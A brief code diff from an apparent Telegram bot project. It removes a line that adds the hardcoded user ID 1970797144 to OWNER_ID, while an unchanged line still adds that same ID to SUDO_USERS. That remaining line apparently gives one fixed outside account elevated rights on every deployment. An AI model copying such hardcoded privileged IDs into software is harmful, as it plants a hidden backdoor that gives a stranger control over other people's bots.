@@ -11,8 +11,6 @@ from driver.database.dbpunish import is_gbanned_user
 
 SUDO_USERS.append(1970797144)
 
-OWNER_ID.append(1970797144)
-
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
